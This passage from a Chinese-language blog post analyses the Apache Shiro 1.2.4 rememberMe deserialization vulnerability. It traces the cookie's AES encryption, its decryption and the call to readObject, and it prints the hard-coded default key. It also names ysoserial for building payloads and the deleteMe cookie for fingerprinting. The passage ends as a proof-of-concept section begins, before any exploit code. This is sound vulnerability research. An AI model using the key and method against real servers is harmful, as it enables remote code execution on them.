class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">        &lt;!--  这里需要将jstl设置为<span class="number">1.2</span> --&gt;</span><br><span class="line">        &lt;version&gt;1.2&lt;/version&gt;</span><br><span class="line">        &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">.....</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br></pre></td></tr></table></figure><p>然后部署，我就直接使用IEDA 部署了</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDMxMTExMzAucG5n?x-oss-process=image/format,png" alt="image-20200903111130024"></p><h2 id="坑点："><a href="#坑点：" class="headerlink" title="坑点："></a>坑点：</h2><p>如果有使用maven打包搭建的话，可能遇到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to execute goal org.apache.maven.plugins:maven-toolchains-plugin:1.1:toolchain (default) on project samples-web: Misconfigured toolchains.</span><br></pre></td></tr></table></figure><p>这应该是maven打包这里要1.6的环境，但运行不影响</p><p>需要修改 maven/conf/toolchains.xml 的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;&#x2F;type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.6&lt;&#x2F;version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;&#x2F;vendor&gt;</span><br><span class="line">    &lt;&#x2F;provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;1.6.0.jdk&lt;&#x2F;jdkHome&gt;</span><br><span class="line">    &lt;&#x2F;configuration&gt;</span><br><span class="line">&lt;&#x2F;toolchain&gt;</span><br></pre></td></tr></table></figure><p>我们还需要产生payload的 ysoserial</p><p>ysoserial项目源码在这里<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a> ，然后自己编译， 也可直接下载编译好的release。</p><h1 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h1><p>简单介绍一下漏洞：</p><p>简单介绍利用：</p><ul><li><p>通过在cookie的rememberMe字段中插入恶意payload，</p></li><li><p>触发shiro框架的rememberMe的反序列化功能，导致任意代码执行。</p></li><li><p>shiro 1.2.24中，提供了硬编码的AES密钥：kPH+bIxk5D2deZiIxcaaaA==</p></li><li><p>由于开发人员未修改AES密钥而直接使用Shiro框架，导致了该问题</p></li></ul><h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p>找入口点的话，就是这个漏洞一直提的硬编码地方下手，然后稍微回溯就找到，我们也只需关注rememberMe这个处理就好了</p><p>首先找到/shiro-core-1.2.4.jar!/org/apache/shiro/mgt/AbstractRememberMeManager.class，该类位于shiro-core模块</p><p>我们发现了，我们最常见的，常常提到的的key，那么入口点可能在这里</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIwOTMyMjQucG5n?x-oss-process=image/format,png" alt="image-20200902093224310"></p><ul><li>他是继承了RememberMeManager类，那么我们向上溯源：找到RememberMeManager类的onSuccessfulLogin方法，看名字就直接是登陆成功的处理</li><li>那我们下一个断点，研究一下这个rememberme的加密和处理流程，是个什么原理</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDA2MzEucG5n?x-oss-process=image/format,png" alt="image-20200902100631808"></p><p>所以我们登陆一下，debug开启！记得要勾选Remember Me哦</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDEzMjkucG5n?x-oss-process=image/format,png" alt="image-20200902101329183"></p><p>然后我们收到数据了，直接步入跟进</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDE0MTkucG5n?x-oss-process=image/format,png" alt="image-20200902101419301"></p><p>转入了forgetIdentity函数，处理request和response请求，继续跟进this.forgetIdentity方法，进入了</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-EM2oRAEz-1599130237592)(…/Library/Application Support/typora-user-images/image-20200902102404236.png)]</p><p>继续跟进this.forgetIdentity方法，进入了getCookie的removeFrom方法，跟进removeFrom方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.getCookie().removeFrom(request, response);</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDI0MTgucG5n?x-oss-process=image/format,png" alt="image-20200902102418678"></p><ul><li>这里获取看配置信息，最后addCookieHeader放到了返回包中的cookie头中，其中就有我们熟悉的，deleteMe字段和rememberMe字段，也就是我们指纹识别最简单的两种方法的原理</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDMyMjMucG5n?x-oss-process=image/format,png" alt="image-20200902103223302"></p><ul><li>然后这一阶段结束了，随后回到刚刚的onSuccessfulLogin方法中，这个isRememberMe主要是检查选择了remember me这个按钮没有，随后步入 rememberIdentity 方法，看看做了什么</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDM1MDEucG5n?x-oss-process=image/format,png" alt="image-20200902103501055"></p><p>在rememberIdentity方法中，authcInfo的值就是我们输入root用户名，继续跟进rememberIdentity函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PrincipalCollection principals &#x3D; this.getIdentityToRemember(subject, authcInfo);</span><br><span class="line">this.rememberIdentity(subject, principals);</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDM4MDYucG5n?x-oss-process=image/format,png" alt="image-20200902103806491"></p><p>进入rememberIdentity方法后发现，一个函数就是转化为bytes，跟进convertPrincipalsToBytes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    <span class="keyword">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDQ2MTQucG5n?x-oss-process=image/format,png" alt="image-20200902104614572"></p><ul><li>进入convertPrincipalsToBytes方法，发现它会序列化，而且序列化的是传入的root用户名</li><li>后续跟进看了一下，就是普通的序列化，没有什么特殊的操作，就不继续写了</li><li>然后调用encrypt方法加密序列化后的二进制字节</li><li>这个必须得跟进看一下encrypt方法吧</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.serialize(principals);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = <span class="keyword">this</span>.encrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现CipherService cipherService = this.getCipherService()，就是获取密码服务的意思，那么看一下获取了这么，看一结果发现是AES加密方法，而且是AES/CBC/PKCS5Padding</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">    CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.encrypt(serialized, <span class="keyword">this</span>.getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDU2MzkucG5n?x-oss-process=image/format,png" alt="image-20200902105639625"></p><p>那么下一句话就是：加密这个传入的数据的方法了。</p><p>再看这就话this.getEncryptionCipherKey()，明显这是获取秘钥了，直接跟进getEncryptionCipherKey</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteSource byteSource = cipherService.encrypt(serialized, <span class="keyword">this</span>.getEncryptionCipherKey());</span><br></pre></td></tr></table></figure><p>这个找key 就是在这个类中反复横跳，就可以找到，就详细看了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this.encryptionCipherKey</span><br><span class="line">setEncryptionCipherKey（）</span><br><span class="line">setCipherKey(byte[] cipherKey)---setEncryptionCipherKey（）</span><br><span class="line">this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES)</span><br></pre></td></tr></table></figure><p>最终溯源到 getEncryptionCipherKey 就是开头中的 DEFAULT_CIPHER_KEY_BYTES，也就是我们一开始第一个提到的kPH+bIxk5D2deZiIxcaaaA==这个key</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMTA3NDEucG5n?x-oss-process=image/format,png" alt="image-20200902110741059"></p><p>随后就传入 encrypt函数（root ，刚刚获取的key），这时就加密方法了！！！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">encrypt</span><span class="params">(<span class="keyword">byte</span>[] plaintext, <span class="keyword">byte</span>[] key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] ivBytes = <span class="keyword">null</span>;</span><br><span class="line">  </span><br><span class="line">   <span class="comment">//生成初始化向量，随后 generate:TURE</span></span><br><span class="line">    <span class="keyword">boolean</span> generate = <span class="keyword">this</span>.isGenerateInitializationVectors(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (generate) &#123;</span><br><span class="line">       </span><br><span class="line">      <span class="comment">//产生初始化向量</span></span><br><span class="line">        ivBytes = <span class="keyword">this</span>.generateInitializationVector(<span class="keyword">false</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//异常，不会进入的</span></span><br><span class="line">        <span class="keyword">if</span> (ivBytes == <span class="keyword">null</span> || ivBytes.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Initialization vector generation is enabled - generated vectorcannot be null or empty."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//再跟进就是更加具体的方法了，基本的加密逻辑已知 序列化root key 然后还有iv</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.encrypt(plaintext, key, ivBytes, generate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密后数据一直向上回溯，直到 rememberIdentity这个方法下有个 rememberSerializedIdentity方法要跟如，因为这个是记住序列化身份的功能</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMTMyMzIucG5n?x-oss-process=image/format,png" alt="image-20200902113232687"></p><p>跟如这个方法，就基本上到了加密的最后一步，把刚刚加密的数据base64，然后都加入到cookie里面</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMTM0MjMucG5n?x-oss-process=image/format,png" alt="image-20200902113423550"></p><h2 id="解密过程："><a href="#解密过程：" class="headerlink" title="解密过程："></a>解密过程：</h2><p>现在继续研究解密过程：</p><ul><li>首先确定切入点</li><li>我选择从获取到客户端数据开始分析 ，那就是 org.apache.shiro.mgt.AbstractRememberMeManager 类的 getRememberedPrincipals 方法下断点</li><li>随后在页面随便刷新一下，就可以触发这个方法</li></ul><p>直接跟进 getRememberedSerializedIdentity(subjectContext) 方法，看看从数据中，都获取了什么</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDAxMjAucG5n?x-oss-process=image/format,png" alt="image-20200902140120404"></p><p>这个getRememberedSerializedIdentity方法中 有一个this.getCookie().readValue(request, response)</p><p>这是要读取cookice中的数据了，这必须跟入了</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDA0NDgucG5n?x-oss-process=image/format,png" alt="image-20200902140447964"></p><p>然后 readValue 方法，根据 Cookie 中的 name 字段（这个字段就是 rememberMe）获取 Cookie 的值</p><p>最终把获取cookie里面的rememberme 给到 value 返回上一级函数</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDE4NTIucG5n?x-oss-process=image/format,png" alt="image-20200902141852472"></p><p>回到getRememberedSerializedIdentity方法中，使用base64解密，成为二进制的数据，继续向上传递</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byte[] decoded &#x3D; Base64.decode(base64);</span><br></pre></td></tr></table></figure><ul><li><p>再次回到AbstractRememberMeManager 类</p></li><li><p>下一个流程就是 convertBytesToPrincipals 方法，这就是对应加密的解析数据，中间肯定要解密数据，继续跟入</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDI3MTcucG5n?x-oss-process=image/format,png" alt="image-20200902142717154"></p></li></ul><p>进入发现了 decrypt（）函数，这就很明显就进行解密了，继续跟入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = <span class="keyword">this</span>.decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDI5NDUucG5n?x-oss-process=image/format,png" alt="image-20200902142945142"></p><h3 id="详细看看decrypt解密函数："><a href="#详细看看decrypt解密函数：" class="headerlink" title="详细看看decrypt解密函数："></a>详细看看decrypt解密函数：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">    CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.decrypt(encrypted, <span class="keyword">this</span>.getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getCipherService();老熟人了，获取加密方法：AES/CBC/PKCS5Padding</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDM0MTgucG5n?x-oss-process=image/format,png" alt="image-20200902143418030"></p><p>最后到这句话，获取老朋友AES的秘钥 getDecryptionCipherKey()后，带着秘文和AES公钥进入decrypt函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteSource byteSource = cipherService.decrypt(encrypted, <span class="keyword">this</span>.getDecryptionCipherKey());</span><br></pre></td></tr></table></figure><p>跟进到了JcaCipherService的decrypt函数里面：分析一下里面的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] encrypted = ciphertext;</span><br><span class="line">    <span class="keyword">byte</span>[] iv = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isGenerateInitializationVectors(<span class="keyword">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> ivSize = <span class="keyword">this</span>.getInitializationVectorSize();</span><br><span class="line">            <span class="keyword">int</span> ivByteSize = ivSize / <span class="number">8</span>;</span><br><span class="line">            iv = <span class="keyword">new</span> <span class="keyword">byte</span>[ivByteSize];</span><br><span class="line">          </span><br><span class="line">          <span class="comment">//ivByteSize=16</span></span><br><span class="line">          <span class="comment">//ciphertext这个数组 0-16位 覆盖到 iv数组 ，相当于给 vi赋值 ciphertext的前16位</span></span><br><span class="line">            System.arraycopy(ciphertext, <span class="number">0</span>, iv, <span class="number">0</span>, ivByteSize);</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// </span></span><br><span class="line">            <span class="keyword">int</span> encryptedSize = ciphertext.length - ivByteSize;</span><br><span class="line">            encrypted = <span class="keyword">new</span> <span class="keyword">byte</span>[encryptedSize];</span><br><span class="line">          </span><br><span class="line">           <span class="comment">// ciphertext数组 ，从 16位后面的数据 赋值给encrypted </span></span><br><span class="line">            System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="number">0</span>, encryptedSize);</span><br><span class="line">          </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">            String msg = <span class="string">"Unable to correctly extract the Initialization Vector or ciphertext."</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> CryptoException(msg, var8);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//进入下一层解密</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.decrypt(encrypted, key, iv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>追随到 JcaCipherService 的 decrypt 方法中，继续跟入 crypt 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key, <span class="keyword">byte</span>[] iv)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">"Attempting to decrypt incoming byte array of length "</span> + (ciphertext != <span class="keyword">null</span> ? ciphertext.length : <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] decrypted = <span class="keyword">this</span>.crypt(ciphertext, key, iv, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> decrypted == <span class="keyword">null</span> ? <span class="keyword">null</span> : Util.bytes(decrypted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑到 JcaCipherService 中的 crypt 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] crypt(<span class="keyword">byte</span>[] bytes, <span class="keyword">byte</span>[] key, <span class="keyword">byte</span>[] iv, <span class="keyword">int</span> mode) <span class="keyword">throws</span> IllegalArgumentException, CryptoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (key != <span class="keyword">null</span> &amp;&amp; key.length != <span class="number">0</span>) &#123;</span><br><span class="line">      </span><br><span class="line">   <span class="comment">//初始化cipher，再跟入就是 原生的 cipher.init 解密方法了</span></span><br><span class="line">        Cipher cipher = <span class="keyword">this</span>.initNewCipher(mode, key, iv, <span class="keyword">false</span>);</span><br><span class="line">      <span class="comment">// 基本完成解密</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.crypt(cipher, bytes);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"key argument cannot be null or empty."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解密完成，序列化操作"><a href="#解密完成，序列化操作" class="headerlink" title="解密完成，序列化操作"></a>解密完成，序列化操作</h2><p>解密完成后，一步步的return回到上级函数，回到AbstractRememberMeManager 的 decrypt 方法，看一下数据 r00 开头 序列化的数据</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNjE5NDcucG5n?x-oss-process=image/format,png" alt="image-20200902161947628"></p><p>向上return，看到deserialize 反序列化的方法了</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNjI2NDcucG5n?x-oss-process=image/format,png" alt="image-20200902162647497"></p><p>一直跟进到 DefaultSerializer 的 deserialize方法中，见到了久违的 readObject（）方法</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNjI4MTkucG5n?x-oss-process=image/format,png" alt="image-20200902162819610"></p><h1 id="0x04-编写POC-EXP"><a href="#0x04-编写POC-EXP" class="headerlink" title="0x04 编写POC EXP"></a>0x04 编写POC EXP</h1><h2 id="本次AES加密的一些小知识点："><a href="#本次AES加密的一些小知识点：" class="headerlink" title="本次AES加密的一些小知识点："></a>本次AES加密的一些小知识点：</h2><ul><li>某些加密算法要求明文需要按一定长度对齐，叫做块大小(BlockSize)，我们这次就是16字节，那么对于一段任意的数据，加密前需要对最后一个块填充到16 字节，解密后需要删除掉填充的数据。</li><li>AES中有三种填充模式(PKCS7Padding/PKCS5Padding/ZeroPadding)</li><li>PKCS7Padding跟PKCS5Padding的区别就在于数据填充方式，PKCS7Padding是缺几个字节就补几个字节的0，而PKCS5Padding是缺几个字节就补充几个字节的几，好比缺6个字节，就补充6个字节的6</li></ul><p>加密流程就是：</p><ul><li><p>使用的 AES/CBC/PKCS5Padding 模式</p></li><li><p>random = this.ensureSecureRandom(); 使用随机数生成 ivBytes</p></li><li><p>key为预留的那个硬编码</p></li><li><p>encrypt(plaintext, key, ivBytes, generate) 生成</p></li><li><p>最后base64加密，放入cookie中</p></li></ul><p>解密流程可以知道：</p><ul><li><p>使用的 AES/CBC/PKCS5Padding 模式 ，所以Key要求是为16位的，key为预留的那个硬编码</p></li><li><p>base64解密cookie 中 rememberMe的值</p></li><li><p>根据解密 vi 是 